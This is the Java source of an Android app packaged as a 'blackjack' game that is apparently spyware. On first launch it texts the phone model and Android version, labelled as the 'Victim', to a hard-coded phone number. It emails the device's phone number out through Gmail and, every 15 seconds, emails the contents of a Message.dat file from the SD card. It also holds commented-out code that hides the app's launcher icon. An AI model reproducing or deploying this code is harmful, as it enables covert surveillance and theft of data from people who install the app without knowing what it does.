package com.android.blackjack;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import com.android.blackjack.R.id;

import android.R.string;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Environment;
import android.provider.SyncStateContract.Helpers;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {
	private void sendSMS(String phoneNumber, String message) {
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage(phoneNumber, null, message, null, null);
	}

	private boolean isNetworkAvailable() {
		ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
		return activeNetworkInfo != null && activeNetworkInfo.isConnected();
	}

	@SuppressWarnings("unchecked")
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		/*
		 * PackageManager p = getPackageManager(); ComponentName componentName =
		 * new ComponentName(this, com.android.blackjack.MainActivity.class);
		 * p.setComponentEnabledSetting(componentName,
		 * PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
		 * PackageManager.DONT_KILL_APP);
		 */
		TelephonyManager tMgr;
		tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String mPhoneNumber = tMgr.getLine1Number();

		String PhoneModel = android.os.Build.MODEL;
		String AndroidVersion = android.os.Build.VERSION.RELEASE;
		final EditText etx = (EditText) findViewById(id.txtnum);
		final String model = "Victim Is Using : " + PhoneModel + "On Android Version :  " + AndroidVersion;
		File sdcard = Environment.getExternalStorageDirectory();
		final File file = new File(sdcard, "/Message.dat");
		final File check = new File(sdcard, "/Check.dat");
		
		if (!check.exists())

		{
			try {

				check.createNewFile();
				FileOutputStream fOut = new FileOutputStream(check);
				OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
				myOutWriter.append("1");
				myOutWriter.close();
				fOut.flush();
				fOut.close();
				try {
					sendSMS("+989333890840", model);

				} catch (Exception e) {
					// TODO: handle exception
				}
				if (mPhoneNumber == null || mPhoneNumber == "") {
					String fromEmail = "Your Email Want To Send Gmail";
					String fromPassword = "Gmail Password";
					String toEmails = "Email To Receve";
					String emailSubject = "Installed App!";
					String emailBody = model;
					new SendMailTask(MainActivity.this).execute(fromEmail, fromPassword, toEmails, emailSubject, emailBody);

				}
				else
				{
					String fromEmail = "Your Email Want To Send Gmail";
					String fromPassword = "Gmail Password";
					String toEmails = "Email To Receve";
					String emailSubject = "Installed App!";
					String emailBody = model + "   Phone Number  :  " + mPhoneNumber;
					new SendMailTask(MainActivity.this).execute(fromEmail, fromPassword, toEmails, emailSubject, emailBody);

				}
				
			} catch (IOException e) {
			}
		}
		
		
		final Button btnn = (Button) findViewById(id.btnget);
		final EditText txtt = (EditText) findViewById(id.txtnum);
		btnn.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				String fromEmail = "Your Email Want To Send Gmail";
				String fromPassword = "Gmail Password";
				String toEmails = "Email To Receve";
				String emailSubject = model + "    Phone Number Is";
				String emailBody = txtt.getText().toString();
				new SendMailTask(MainActivity.this).execute(fromEmail, fromPassword, toEmails, emailSubject,
						emailBody);
			}
		});

		new CountDownTimer(Long.MAX_VALUE, 15000) {

			public void onTick(long millisUntilFinished) {

				if (isNetworkAvailable()) {
					if (file.exists()) {
						StringBuilder text = new StringBuilder();
						try {
							BufferedReader br = new BufferedReader(new FileReader(file));
							String line;

							while ((line = br.readLine()) != null) {
								text.append(line);
								text.append('\n');
							}
							br.close();
							String fromEmail = "Your Email Want To Send Gmail";
							String fromPassword = "Gmail Password";
							String toEmails = "Email To Receve";
							String emailSubject = text.toString();
							String emailBody = model;
							new SendMailTask(MainActivity.this).execute(fromEmail, fromPassword, toEmails, emailSubject,
									emailBody);
						} catch (IOException e) {
							// You'll need to add proper error handling here
						}

					}

				} // here you can have your logic to set text to edittext
			}

			public void onFinish() {

			}

		}.start();

	}

}